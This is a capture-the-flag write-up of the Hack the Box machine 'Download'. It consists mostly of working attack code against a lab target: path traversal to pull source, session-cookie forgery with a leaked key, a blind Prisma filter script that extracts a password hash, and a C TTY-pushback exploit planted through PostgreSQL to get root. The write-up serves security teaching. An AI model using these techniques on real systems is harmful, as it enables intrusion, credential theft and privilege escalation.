---
title: "HTB • Download"
tags:
  - "Advanced"
  - "Linux"
  - "Hard Difficulty"
  - "Web"
  - "JavaScript"
  - "Path Traversal"
  - "CRON Jobs"
  - "Python"
  - "SQL"
  - "PostgreSQL"
  - "Database"
  - "Cryptography"
  - "Hash Cracking"
excerpt: "Download is a hard Linux machine on Hack the Box that involves web path traversal vulnerabilities, CRON jobs, PostgreSQL, and utilizing a TTY pushback for privilege escalation"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-download/"
---

Download is a hard Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/Download) machine created by [**JoshSH**](https://app.hackthebox.com/users/269501) that covers topics including web exploitation, CRON jobs, PostgreSQL, and TTY pushbacks. We initially identified a NodeJS Express application accessible on port 80 and an SSH server on port 22. Further analysis of the web app revealed a path traversal vulnerability that allowed us to recover the site's source code including a key used to validate sessions. Session forgery led to the enumeration of users, disclosing a user named Wesley. We then abused a feature in the Prisma database client to recover Wesley's password hash, which was cracked in order to login via SSH. Privilege escalation started by snooping in on processes to discover PostgreSQL credentials in a Systemd service. Finally, we used these credentials to gain execution as the service user and exploit a TTY pushback to achieve root access.

## Initial Recon

We began by setting up our environment and conducting a TCP port scan using a [custom nmap wrapper script](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh). This script aids in quickly and reliably scanning for open ports on the target.

```zsh
# Set up environment variables and run a port scan
echo rhost="10.10.11.226" >> .env
echo lhost="10.10.14.2" >> .env # Our HTB VPN client IP address
. ./.env && ctfscan $rhost
```
{:file="bryan@redteam ➤ zsh" .nolineno}

The scan reported two open ports:

| Transport | Port | Protocol | Product | Version                 |
|:----------|:-----|:---------|:--------|-------------------------|
| TCP       | 22   | SSH      | OpenSSH | 8.2p1 Ubuntu 4ubuntu0.8 |
| TCP       | 80   | HTTP     | nginx   | 1.18.0 (Ubuntu)         |


## Web

Upon sending a standard GET request to the HTTP server, we are redirected to <http://download.htb>. To access this server more conveniently, we add an entry to our `/etc/hosts`{:.filepath} file. Once this was done we could visit the site in a web browser.

```zsh
echo 'vhost=(download.htb)' >> .env && . ./.env
echo -e "$rhost\t${vhost[@]}" | sudo tee -a /etc/hosts
```
{:file="bryan@redteam ➤ zsh" .nolineno}

![Web index](web-index.png)


### Fingerprinting

With [Wappalyzer](https://www.npmjs.com/package/wappalyzer/v/6.10.66), we discovered that the web service is built on NodeJS Express.

```zsh
# Fingerprint web application
which wappalyzer || npm install --global wappalyzer@6.10.66 # install wappalzer
wappalyzer http://download.htb | tee logs/wappalyzer.json # Fingerprint download.htb
jq '.technologies[]|[.name,.description]' logs/wappalyzer.json # List products
```
{:file="bryan@redteam ➤ zsh" .nolineno}


### Constrained Path Traversal

We discover a file upload feature at [/files/upload](http://download.htb/files/upload) that assigns a seemingly random UUID to each uploaded file. With each valid UUID, we can access the corresponding file using the `/files/download/`{:.filepath} prefix. We began to experiment with this parameter using an existing UUID from a random file that we uploaded.

```zsh
# Test download functionality
uuid="1687d390-a726-48b0-a66c-e934344378d5" # Valid UUID from a file that we uploaded
curl "http://download.htb/files/download/$uuid" # test UUID
curl "http://download.htb/files/download/.%2f$uuid" # ./<UUID> is the same as <UUID>, so it's probably interpreted as a path
```
{:file="bryan@redteam ➤ zsh" .nolineno}

We noticed that prepending `./`{:.filepath} to the UUID parameter results in the same response. This indicates that the parameter is being interpreted as a file path, and is potentially vulnerable to local file disclosure via path traversal.


#### Manual Fuzzing

When trying to traverse to the filesystem root, NGINX reports a bad request likely because it is treating the file parameter as part of the web path and `/files/download/../../../`{:.filepath} exceeds the bounds of the web root. Since this is a NodeJS app though, we found the default `package.json`{:.filepath} via path traversal to the parent directory. The contents point to `../app.js`{:.filepath} as the main source file, so we began to download the source code.

```zsh
# Manually fuzz file path using helper function
download_get_file() {
    param=${1//\//%2F} # URL encode forward slashes
    curl -so- "http://download.htb/files/download/$param" ${@:2} # Send request
}
download_get_file "../../../../../../../etc/hosts" # Read /etc/hosts => 400 Bad Request
download_get_file "../package.json" # Node's package.json should exist => Success!

# Exploit path traversal to download source code
mkdir src # Make directory to store the application source
download_get_file "../app.js" | tee src/app.js # Download main => found a few sources

# Download additional sources imported from app.js
mkdir src/middleware src/routers # Make directory to store the additional sources
for file in package.json middleware/flash.js routers/{auth,files,home}.js
    do download_get_file "../$file" | tee src/$file
done
```
{:file="bryan@redteam ➤ zsh" .nolineno}


### Code Review

We began to search the NodeJS source for credentials, addtional vulnerabilities, or useful information. We first found a potential OS user named "wesley" in the `package.json`{:.filepath} file generated by the Node package manager. In addition, we noted a cryptographic key potentially used to verify user sessions. We also discovered that the application uses the [Prisma database client](https://www.prisma.io/docs/concepts/components/prisma-client) to simplify interaction with databases.

#### Prisma

According to the [documentation](https://www.prisma.io/docs/concepts/components/prisma-client/working-with-prismaclient/generating-prisma-client), Prisma client is generated from a user-defined database schema which is copied to `node_modules/.prisma/client/schema.prisma`{:.filepath} on generation. We downloaded the schema in search of credentials, but instead found information regarding the database solution and some structure definitions.

```zsh
download_get_file "../node_modules/.prisma/client/schema.prisma"
```
{:file="bryan@redteam ➤ zsh" .nolineno}

```text
datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

model User {
  id       Int    @id @default(autoincrement())
  username String @unique
  password String
  files    File[]
}

model File {
  id         String   @id @default(uuid())
  name       String
  size       Int
  private    Boolean  @default(false)
  uploadedAt DateTime @default(now())
  author     User?    @relation(fields: [authorId], references: [id])
  authorId   Int?
}
```
{:file="STDOUT" .nolineno}


### Session Forgery

We created a program to forge valid sessions using snippets of the original source. This program creates an Express web server that signs user-defined objects with the **cookie-session** module and the original key.

```js
const express = require("express");
const cookie_parser = require("cookie-parser");
const cookie_session = require("cookie-session");
const app = express();

app.use(cookie_session({
  name: "download_session",
  keys: ["8929874489719802418902487651347865819634518936754"],
  maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(cookie_parser());
app.use(express.json());
app.post("/sign", async(req, res) => {
  req.session = req.body
  res.send({});
});

app.listen(3000, "127.0.0.1");
```
{:file="forge-session/forge.js"}

We also created a shell function to streamline the process of signing sessions.

```zsh
download_forge_session() {
  curl -i -s "http://127.0.0.1:3000/sign" \
    -H "Content-Type: application/json" \
    -d "$1" |
      grep '^Set-Cookie: ' |
      sed -E 's/^Set-Cookie: ([^;]+).*/\1;/'
}
```
{:file="bryan@redteam ➤ zsh" .nolineno}


#### Enumerate Users

The target app finds information about the authenticated user by matching each author entry to `req.session.user` in `routers/home.js`{:.filepath}. Since we can control `req.session.user` with a forged session, we can decide which attribute we want to match from the User model and get the username associated with that row.

```js
const files = await client.file.findMany({
  where: { author: req.session.user },
  select: {
    id: true,
    uploadedAt: true,
    size: true,
    name: true,
    private: true,
    authorId: true,
    author: {
      select: {
        username: true,
      },
    },
  },
});
```
{:file="src/routers/home.js" .nolineno}

We choose to use the _id_ field because the Prisma schema defines it as autoincrement which makes it very predictable. Using our session forgery program and shell function, we enumerated users and their files.

```zsh
node forge-session/forge.js & mkdir ids
for id in {1..16}
do
  cookies=($(download_forge_session '{"user":{"id":'$id'}}'))
  curl -b "$cookies" http://download.htb/home/ -so ids/$id
done
grep 'Uploaded By:' ids/* | sort -u
```
{:file="bryan@redteam ➤ zsh" .nolineno}

This leads us to the discovery of the first username created in the table, "WESLEY", which actually matches the author name in `package.json`{:.filepath}.

#### Password Recovery

After further research into Prisma client, we noted the [filter conditions](https://www.prisma.io/docs/concepts/components/prisma-client/filtering-and-sorting) feature, which could enable us to recover values from the database using only two distinct responses (similar to boolean-based SQL injection). This process is automated using a shell function with a username argument.

```zsh
# This will recover the password hash associated with the given username
download_fuzz_password_field() {
  hash=""
  tmpl='{"user":{"username":"'"$1"'","password":{"startsWith":"FUZZ"}}}'
  for i in {1..32} # Password hash alg is MD5 = 16 bytes = 32 hex chars
  do
    for c in {0..9} {a..f} {A..F} # All hex chars
    do
      cookies=($(download_forge_session "${tmpl//FUZZ/$hash$c}"))
      len=$(curl http://download.htb/home/ -b "$cookies" -so /dev/null -w '%{size_download}')
      if [ $len != 2166 ] # Response length 2166 indicates invalid user
      then
        hash+="$c"
        printf "Found char: '%s'\n" "$c" >&2
        break
      fi
    done
  done
  echo "$hash"
}

download_fuzz_password_field "WESLEY"
```
{:file="bryan@redteam ➤ zsh" .nolineno}

We successfully recovered the hash for Wesley's account then cracked it using [John the Ripper](https://github.com/openwall/john) with the standard [RockYou](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz) password list.

```zsh
# Recover Wesley's password
echo 'WESLEY:f88976c10af66915918945b9679b2bd3' >> md5.lst # Save hash
john --wordlist="~/wordlist/rockyou.txt" --format="Raw-MD5" ./md5.lst # Crack hashes
john --show --format="Raw-MD5" ./md5.lst # Display cracked hashes
```
{:file="bryan@redteam ➤ zsh" .nolineno}
```text
WESLEY:dunkindonuts

1 password hash cracked, 0 left
```
{:file="STDOUT" .nolineno}

With this password, we were able to establish an SSH session as the OS user _wesley_.


## Privilege Escalation

### Process Snooping

We first uploaded and executed the latest [PSpy release](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) to snoop on processes started by other users.

```zsh
# Copy static PSpy executable to the target
scp pspy64 wesley@$rhost:~/nEcdd7
```
{:file="bryan@redteam ➤ zsh" .nolineno}
```bash
# Run PSpy for five minutes
cd `mktemp -d /tmp/05dJPb.XXXXXX` && mv ~/nEcdd7 . # Move pspy
chmod 700 nEcdd7 # Make PSspy executable + private
timeout 5m ./nEcdd7 -i 10 --ppid | tee pspy.log # Run pspy, display PPID, 5ms interval
```
{:file="wesley@download (SSH) ➤ bash" .nolineno}

We noticed a set of processes that ran as root from a shell script named `manage-db`{:.filepath}. One process queries a custom systemd service called "download-site". We decided to read the file associated with this service at `/etc/systemd/system/download-site.service`{:.filepath}

```bash
# Investigate "download-site" service
service "download-site" status # Locate the service file
more /etc/systemd/system/download-site.service # Read the service file
```
{:file="wesley@download (SSH) ➤ bash" .nolineno}
```
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"

[Install]
WantedBy=multi-user.target
```
{:file="STDOUT" .nolineno}

We find the value of `DATABASE_URL` in the web server process, which contains credentials to login on the local PostgreSQL server


### PostgreSQL

We logged in using the credentials we found in the service, then listed our permissions on the PostgreSQL server with the built-in command `\du`. We noticed one special permission called "pg_write_server_files" which allows us to write files as the service user _postgres_. We noticed that root runs `su -l postgres` from the PSpy logs, so writing to `.profile`{:.filepath} in the service user's home directory would allow us to execute commands each time they run `bash`.

```bash
# Connect to PostgreSQL server with credentials
psql -U download -h localhost
```
{:file="wesley@download (SSH) ➤ bash" .nolineno}


### TTY Pushback

Looking back at the PSpy output, a group of interesting processes were started by a script executed as root. We began to reconstruct the process tree created by this script using the PIDs and PPIDs displayed in the PSpy output.

```text
bash -i ./manage-db
├── systemctl status postgresql
├── systemctl status download-site
└── su -l postgres
    └── bash
        └── perl /usr/bin/psql
```
{:.nolineno}

Since we had a path to access _postgres_, we could execute a [TTY Pushback](https://www.errno.fr/TTYPushback.html) to escape the context created by `su -l postgres`, and execute shell commands as root. Using information from [this article](https://www.errno.fr/TTYPushback.html), we created a C program to exploit this flaw.

```c
// gcc -static -o pushback pushback.c
#include <sys/ioctl.h>
#include <termios.h>
#include <signal.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  // Make sure a command is specified
  if (argc > 1) {
    // Kill parent process
    kill(getppid(), SIGSTOP);

    // Send each char in command
    while (*argv[1]) {
      char c[] = { *argv[1]++ };
      ioctl(0, TIOCSTI, c);
    }
    // Terminate with new line
    ioctl(0, TIOCSTI, "\n");
    return 0;
  }
  return 1;
}
```
{:file="pushback.c"}

We compiled the program, copied it to the target, then used a `COPY TO` statement on the PostgreSQL server to copy the exploit trigger to `/var/lib/postgresql/.profile`{:.filepath}. The copied `.profile`{:.filepath} is deleted shortly after upload, but we can get around this using the `\watch` command.

```zsh
# Compile executable
gcc -static -o pushback pushback.c

# Copy program to target
scp pushback wesley@$rhost:/tmp/05dJPb.HiSv36
```
{:file="bryan@redteam ➤ zsh" .nolineno}

```bash
# The command we want to run as root - make SUID shell
cmd="chmod +s /bin/sh"

# Save COPY query to disk
cat << EOF > /tmp/05dJPb.azPl6p
copy (select '/tmp/05dJPb.HiSv36 "$cmd"') to '/var/lib/postgresql/.profile';
\watch 0.5
EOF

# (In another session) Continuously copy exploit trigger to .profile
psql -U download -h localhost -f /tmp/05dJPb.azPl6p
```
{:file="wesley@download (SSH) ➤ bash" .nolineno}

After waiting a couple of minutes, we found that our command had executed and added the SUID bit to `/bin/sh`{:.filepath}. We then simply executed `/bin/sh -p` to spawn a root shell.

* * *

Once we have the flags, we stop our processes, remove the SUID bit from `/bin/sh`{:.filepath}, and remove our files in `/tmp`{:.filepath}.

```zsh
# Clean up
chmod -s /bin/sh
rm -rf /tmp/05dJPb.*
```
{:file="root@download ➤ bash" .nolineno}